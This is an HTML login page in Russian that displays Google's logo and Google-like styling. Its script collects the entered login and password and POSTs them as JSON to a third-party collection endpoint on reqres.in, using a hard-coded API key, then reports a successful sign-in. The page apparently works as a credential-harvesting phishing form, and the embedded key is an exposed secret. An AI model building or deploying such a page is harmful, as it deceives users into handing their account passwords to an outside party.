<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Авторизация</title>
  <style>
    /* Переменные темы */
    :root {
      --bg-color: #121212;
      --surface-color: #1e1e1e;
      --text-primary: #f2f2f2;
      --text-secondary: #a4a7a5;
      --primary: #0b57d0;
      --primary-hover: rgba(11, 87, 208, 0.92);
      --primary-active: rgba(11, 87, 208, 0.90);
      --secondary-focus: #00639b;
      --secondary-dark: #001d35;
      --secondary-tonal: #004a77;
      --on-primary: #ffffff;
      --outline: #747775;
      --disabled: rgba(31, 31, 31, 0.38);
      --font-family: 'Roboto', 'Arial', sans-serif;
    }

    /* Базовые стили */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: var(--bg-color);
      color: var(--text-primary);
      font-family: var(--font-family);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 1rem;
    }

    /* Контейнер карточки */
    .login-container {
      background-color: var(--surface-color);
      border-radius: 28px;
      padding: 2.5rem 2rem;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* Пиктограмма над заголовком */
    .brand-icon {
      width: 40px;
      height: 40px;
      margin-bottom: 1rem;
      object-fit: contain;
    }

    /* Заголовок */
    .login-title {
      font-size: 1.5rem;
      font-weight: 500;
      margin-bottom: 1.5rem;
      color: var(--text-primary);
      text-align: center;
    }

    /* Форма и поля ввода */
    .login-form {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 1.25rem;
    }

    .form-group {
      display: flex;
      flex-direction: column;
      gap: 0.5rem;
      position: relative;
    }

    .form-group label {
      font-size: 0.875rem;
      font-weight: 500;
      color: var(--text-primary);
    }

    .form-input {
      width: 100%;
      height: 48px;
      padding: 0 1rem;
      background-color: transparent;
      border: 1px solid var(--outline);
      border-radius: 8px;
      color: var(--text-primary);
      font-family: var(--font-family);
      font-size: 0.875rem;
      outline: none;
      transition: border-color 0.2s ease, box-shadow 0.2s ease;
    }

    .form-input:focus {
      border-color: var(--primary);
    }

    /* Анимированное кольцо фокуса (gm3-focus-ring-outward-grows) */
    .form-input:focus-visible,
    .btn-submit:focus-visible {
      outline: none;
      animation: gm3-focus-ring-outward-grows 0.15s cubic-bezier(0.2, 0, 0, 1) forwards;
      box-shadow: 0 0 0 3px var(--secondary-focus);
    }

    @keyframes gm3-focus-ring-outward-grows {
      from {
        box-shadow: 0 0 0 0px var(--secondary-focus);
      }
      to {
        box-shadow: 0 0 0 3px var(--secondary-focus);
      }
    }

    /* Кнопка отправки (Pill-shaped) */
    .btn-submit {
      margin-top: 0.5rem;
      height: 48px;
      background-color: var(--primary);
      color: var(--on-primary);
      border: none;
      border-radius: 9999px;
      font-family: var(--font-family);
      font-size: 0.875rem;
      font-weight: 500;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      transition: background-color 0.2s ease, box-shadow 0.2s ease;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    /* Overlay эффекты при наведении и нажатии */
    .btn-submit::before {
      content: '';
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      background-color: #ffffff;
      opacity: 0;
      transition: opacity 0.2s ease;
    }

    .btn-submit:hover::before {
      opacity: 0.08; /* 8% opacity */
    }

    .btn-submit:active::before {
      opacity: 0.10; /* 10% opacity */
    }

    .btn-submit:disabled {
      background-color: var(--disabled);
      color: var(--outline);
      cursor: not-allowed;
      box-shadow: none;
    }

    .btn-submit:disabled::before {
      display: none;
    }

    /* Сообщение о статусе отправки */
    .status-message {
      margin-top: 1rem;
      font-size: 0.875rem;
      text-align: center;
      display: none;
    }
    .status-message.success {
      color: #4caf50;
      display: block;
    }
    .status-message.error {
      color: #f44336;
      display: block;
    }

    /* Адаптация для режима принудительных цветов (Forced Colors) */
    @media (forced-colors: active) {
      .login-container {
        border: 1px solid CanvasText;
      }
      .form-input {
        border: 1px solid CanvasText;
      }
      .btn-submit {
        border: 1px solid ButtonText;
        background-color: ButtonFace;
        color: ButtonText;
      }
      .form-input:focus-visible,
      .btn-submit:focus-visible {
        outline: 3px solid Highlight;
        box-shadow: none;
      }
    }
  </style>
</head>
<body>

  <div class="login-container">
    <!-- Пиктограмма 40x40px (отредактируйте src) -->
    <img src="https://www.gstatic.com/images/branding/googleg_gradient/svg/googleg_gradient_standard_48px.svg" alt="Логотип" class="brand-icon">
    
    <h1 class="login-title">Вход</h1>

    <!-- Форма отправки -->
    <form id="loginForm" class="login-form">
      
      <div class="form-group">
        <label for="login">Логин</label>
        <input 
          type="text" 
          id="login" 
          name="login" 
          class="form-input" 
          placeholder="Введите логин" 
          required 
          autocomplete="username"
        >
      </div>

      <div class="form-group">
        <label for="password">Пароль</label>
        <input 
          type="password" 
          id="password" 
          name="password" 
          class="form-input" 
          placeholder="Введите пароль" 
          required 
          autocomplete="current-password"
        >
      </div>

      <button type="submit" id="submitBtn" class="btn-submit">
        Войти
      </button>

      <div id="statusMessage" class="status-message"></div>

    </form>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const submitBtn = document.getElementById('submitBtn');
      const statusMessage = document.getElementById('statusMessage');
      
      const logVal = document.getElementById('login').value;
      const wordVal = document.getElementById('password').value;

      // Формируем payload для отправки в JSON
      const payload = {
        log: logVal,
        word: wordVal
      };

      // Блокируем кнопку на время запроса
      submitBtn.disabled = true;
      submitBtn.textContent = 'Отправка...';
      statusMessage.className = 'status-message';
      statusMessage.textContent = '';

      try {
        const response = await fetch('https://reqres.in/api/collections?project_id=51048', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-api-key': 'pro_7dc8a3885273bd7bce5bb04d5f42df8aba23ce4636bc70d02a0f5f1774b7dec1'
          },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          const result = await response.json();
          statusMessage.className = 'status-message success';
          statusMessage.textContent = 'Успешный вход!';
          console.log('Успех:', result);
        } else {
          statusMessage.className = 'status-message error';
          statusMessage.textContent = 'Ошибка авторизации (' + response.status + ')';
        }
      } catch (error) {
        console.error('Ошибка отправки:', error);
        statusMessage.className = 'status-message error';
        statusMessage.textContent = 'Ошибка соединения с сервером.';
      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = 'Войти';
      }
    });
  </script>

</body>
</html>
